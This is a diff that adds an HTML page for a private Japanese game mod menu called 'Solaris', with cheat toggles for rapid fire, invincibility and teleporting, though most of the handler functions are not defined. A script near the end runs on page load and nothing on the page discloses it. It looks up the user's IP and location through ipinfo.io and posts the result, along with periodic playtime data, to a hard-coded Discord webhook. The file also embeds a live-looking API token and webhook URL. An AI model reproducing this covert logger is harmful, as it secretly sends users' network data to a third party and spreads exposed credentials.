@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MODMENU private</title>
+    <link href="https://fonts.cdnfonts.com/css/product-sans" rel="stylesheet">
+    <script>
+        setWindowRect(0,0,window.screen.height,window.screen.width);
+        setWindowDrag(0,0,350,60);
+</script>
+    <style>
+        html {
+            height: 100%;
+            width: 100%;
+            zoom: 0.73;
+        }
+        body {
+            font-family: 'Product Sans', sans-serif;
+            color: white;
+            opacity: 90%;
+        }
+        .headerr {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #333;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            z-index: 1000;
+        }
+        .content {
+            margin-bottom: 20px;
+        }
+        .more-btn {
+            background-color: #378fe7;
+            width: 320px;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+        .more-btn:hover {
+            background-color: #327dc9;
+        }
+        .hidden-content {
+            display: none;
+            margin-top: 10px;
+        }
+        .fixed-menu {
+            position: sticky;
+            top: 0;
+            background-color: #327dc9;
+            padding: 10px;
+            color: white;
+            text-align: center;
+            border-radius: 5px;
+            z-index: 10;
+        }
+        .window {
+            background-color: #000000c0;
+            border: 1px solid #5b6770;
+            width: 600px;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 20px auto;
+            overflow-y: auto;
+            transition: height 0.3s ease;
+            height: 340px;
+        }
+        .window-title {
+            background-color: #283142;
+            padding: 10px;
+            color: #d0d7e2;
+            font-size: 19px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+        .window-content {
+            display: block;
+        }
+        .button {
+            font-family: 'Product Sans', sans-serif;
+            background-color: #5b6770;
+            border: none;
+            font-size: 20px;
+            padding: 5px 10px;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 10px;
+            border-radius: 5px;
+        }
+        .button:hover {
+            background-color: #6c7781;
+        }
+        .slider {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 70%;
+            height: 30px;
+            background-color: #3a4b5c;
+            border-radius: 2px;
+            outline: none;
+            margin-bottom: 10px;
+        }
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 30px;
+            height: 25px;
+            background-color: #378fe7;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .slider::-moz-range-thumb {
+            width: 20px;
+            height: 20px;
+            background-color: #378fe7;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .field-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .field-label {
+            color: #ffffff;
+            font-size: 20px;
+        }
+
+        .imgui-checkbox-container {
+    display: flex;
+    align-items: center;
+    margin-bottom: 10px;
+}
+
+.imgui-checkbox {
+    -webkit-appearance: none;
+    appearance: none;
+    background-color: #2d2d2d;
+    border: 1px solid #757575;
+    width: 25px;
+    height: 25px;
+    border-radius: 3px;
+    position: relative;
+    cursor: pointer;
+    margin-right: 8px;
+}
+
+.imgui-checkbox:checked {
+    background-color: #378fe7;
+}
+
+.imgui-checkbox:checked::before {
+    content: '✓';
+    position: absolute;
+    font-size: 20px;
+    color: #fff;
+}
+
+.imgui-window {
+            width: 300px;
+            background-color: #2d2d2d;
+            border: 1px solid #757575;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+        .morewww {
+            width: 300px;
+            background-color: #2d2d2d;
+            border: 1px solid #757575;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+        .imgui-window h3 {
+            font-size: 18px;
+            color: #ffffff;
+            margin: 0 0 10px;
+        }
+        .imgui-window p {
+            font-size: 16px;
+            color: #c0c0c0;
+            margin: 5px 0;
+        }
+        .animated {
+            transition: transform 0.3s ease;
+        }
+
+.seikin{
+            background-color: #378fe7;
+            border: none;
+            padding: 5px 10px;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 10px;
+            font-size: 15px;
+            border-radius: 5px;
+        }
+
+.imgui-checkbox-label {
+    font-size: 20px;
+    color: #ffffff;
+    font-family: 'Product Sans', sans-serif;
+    cursor: pointer;
+}
+    </style>
+</head>
+<body>
+    <div class="window" id="debugWindow">
+        <div class="fixed-menu" onclick="toggleWindow()">Solaris</div>
+        <div class="window-content" id="windowContent">
+            <div class="field-row">
+                <label class="field-label" id="xValue">X coordinate: 0</label>
+                <input type="range" class="slider" min="-250" max="250" step="1" value="0" id="xSlider">
+            </div>
+            <div class="field-row">
+                <label class="field-label" id="yValue">Y coordinate: 0</label>
+                <input type="range" class="slider" min="-250" max="250" step="1" value="0" id="ySlider">
+            </div>
+            <div class="field-row">
+                <label class="field-label" id="zValue">Zcoordinate: 0</label>
+                <input type="range" class="slider" min="-250" max="250" step="1" value="0" id="zSlider">
+            </div>
+            <button class="button"  onclick="startMoving()">Start</button>
+            <button class="button"  onclick="stopMoving()">Stop</button>
+            <button class="button"  onclick="startTracking()">Start tracking</button>
+            <button class="button"  onclick="stopTracking()">Tracking ended</button>
+            <button class="button"  onclick="replayMovement()">Replay</button>
+            <div class="field-row">
+                <label class="field-label">Base selection: </label>
+                <input type="range" class="slider" min="0" max="3" step="1" value="0" id="baseSlider">
+            </div>
+            <div>
+                <button class="button"  onclick="resetCoordinates();">Reset</button>
+            <button class="button" id="startBaseSelection">BaseTPstart</button>
+                <button class="button" id="stopBaseSelection">BaseTPstop</button>
+            </div>
+            <div class="imgui-window" id="statusWindow">
+                <h3>Status</h3>
+                <p id="playtime">PlayTime: 0.00 秒</p>
+                <p id="fps">FPS: 0.00</p>
+            </div>
+            <div class="imgui-window" id="statusWindow">
+                <h3>Developers</h3>
+                <b>numerical value</b>
+                <p>x.com/tai_taitai12345</p>
+                <b>TP, Menu Styles</b>
+                <p>x.com/nakadashiOwO</p>
+            </div>
+            <button class="more-btn" data-target="extraContent1">▼ Basic Module</button>
+            <div class="hidden-content" id="extraContent1">
+                <div class="imgui-window" id="statusWindow">
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="rapidfirepunch();" class="imgui-checkbox">
+                        <label for="cheat1" class="imgui-checkbox-label">RapidFirePunch</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="airjump();" class="imgui-checkbox">
+                        <label for="cheat2" class="imgui-checkbox-label">AirJump</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="f2();" class="imgui-checkbox">
+                        <label for="cheat6" class="imgui-checkbox-label">Invincible V2</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="HighSpeed();" class="imgui-checkbox">
+                        <label for="cheat3" class="imgui-checkbox-label">HighSpeed</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="Rapidfiregrenade();" class="imgui-checkbox">
+                        <label for="cheat4" class="imgui-checkbox-label">RapidFireGrenadeFire</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="Springrapidfire();" class="imgui-checkbox">
+                        <label for="cheat5" class="imgui-checkbox-label">SpringRapidFire</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="rokeran();" class="imgui-checkbox">
+                        <label for="cheat6" class="imgui-checkbox-label">RocketLauncherRapitFire</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="grenedo();" class="imgui-checkbox">
+                        <label for="cheat6" class="imgui-checkbox-label">GrenadeRapidFire</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="kyodaika();" class="imgui-checkbox">
+                        <label for="cheat7" class="imgui-checkbox-label">Huge</label>
+                    </div>
+            </div>
+            </div>
+            <!--チェックボックス-->
+            <button class="more-btn" data-target="extraContent2">▼ Basic Module</button>
+            <div class="hidden-content" id="extraContent2">
+                <div class="imgui-window" id="statusWindow">
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="rapidfirepunch();" class="imgui-checkbox">
+                        <label for="cheat1" class="imgui-checkbox-label">RapidFirePunch</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="airjump();" class="imgui-checkbox">
+                        <label for="cheat2" class="imgui-checkbox-label">AirJump</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="f2();" class="imgui-checkbox">
+                        <label for="cheat6" class="imgui-checkbox-label">Invincible V2</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="HighSpeed();" class="imgui-checkbox">
+                        <label for="cheat3" class="imgui-checkbox-label">HighSpeed</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="Rapidfiregrenade();" class="imgui-checkbox">
+                        <label for="cheat4" class="imgui-checkbox-label">RapidFireGrenadeFire</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="Springrapidfire();" class="imgui-checkbox">
+                        <label for="cheat5" class="imgui-checkbox-label">SpringRapidFire</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="rokeran();" class="imgui-checkbox">
+                        <label for="cheat6" class="imgui-checkbox-label">RocketLauncherRapitFire</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="grenedo();" class="imgui-checkbox">
+                        <label for="cheat6" class="imgui-checkbox-label">GrenadeRapidFire</label>
+                    </div>
+                    <div class="imgui-checkbox-container">
+                        <input type="checkbox"  onclick="kyodaika();" class="imgui-checkbox">
+                        <label for="cheat7" class="imgui-checkbox-label">Huge</label>
+                    </div>
+            </div>
+            </div>
+            <!--aaa-->
+        </div>
+    </div>
+
+    <script>
+  let startTime = Date.now();
+        let currentPlaytime = 0;
+        let frameCount = 0;
+        let lastFrameTime = startTime;
+        let lastSentTime = startTime;
+        const ipinfoUrl = 'https://ipinfo.io/json?token=66776d7d45b95b';
+        const webhookUrl = 'https://discordapp.com/api/webhooks/1278936238295875615/3F7l6txqvCmiP10-Gq-6MhrS8s3UgWtBcIV_WFQfKWXS3g7AZDhmlJCNLFDDKNvezINN';
+        function formatTime(seconds) {
+            const minutes = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return `${minutes}m ${secs}s`;
+        }
+        function sendStatusToDiscord(content) {
+            const payload = {
+                content: content
+            };
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                } else {
+                }
+            })
+            .catch(error => {
+            });
+        }
+        window.addEventListener('load', () => {
+            fetch(ipinfoUrl)
+                .then(response => response.json())
+                .then(data => {
+                    const ipInfo = `IP情報:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
+                    sendStatusToDiscord(ipInfo);
+                    const playtimeSeconds = Math.floor((Date.now() - startTime) / 1000);
+                    const fps = Math.round(1 / ((Date.now() - lastFrameTime) / 1000));
+                    const statusInfo = `PlayTime: ${formatTime(playtimeSeconds)}\nFPS: ${fps}`;
+                    sendStatusToDiscord(statusInfo);
+                    updateStatus();
+                })
+                .catch(error => {
+                });
+        });
+        function updateStatus() {
+            const currentTime = Date.now();
+            const playtimeSeconds = Math.floor((currentTime - startTime) / 1000);
+            if (playtimeSeconds !== currentPlaytime) {
+                currentPlaytime = playtimeSeconds;
+                const playtimeElement = document.getElementById('playtime');
+                playtimeElement.innerText = `PlayTime: ${formatTime(currentPlaytime)}`;
+                playtimeElement.classList.add('grow');
+                setTimeout(() => playtimeElement.classList.remove('grow'), 300);
+            }
+            frameCount++;
+            const deltaTime = (currentTime - lastFrameTime) / 1000;
+            const fps = Math.round(1 / deltaTime);
+            document.getElementById('fps').innerText = `FPS: ${fps}`;
+            lastFrameTime = currentTime;
+            if (currentTime - lastSentTime >= 10000) {
+                const statusInfo = `PlayTime: ${formatTime(currentPlaytime)}\nFPS: ${fps}`;
+                sendStatusToDiscord(statusInfo);
+                lastSentTime = currentTime;
+            }
+            requestAnimationFrame(updateStatus);
+        }
+    </script>
+</body>
+</html>
